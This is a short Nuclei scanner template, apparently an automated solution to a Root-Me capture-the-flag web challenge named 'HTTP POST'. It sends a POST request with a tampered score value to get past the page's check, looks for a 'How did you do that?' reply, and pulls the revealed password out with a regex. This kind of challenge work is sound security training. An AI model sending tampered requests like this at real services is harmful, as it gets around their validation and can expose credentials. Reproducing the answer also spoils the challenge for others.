id: HTTP-POST

info:
  name: HTTP POST
  author: Tomitom13
  severity: unknown
  tags: rootme

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded

        score=1000000&generate=submit

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "How did you do that?"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "<strong>[a-zA-Z0-8!@#$%^&*()_+,.>?]+"
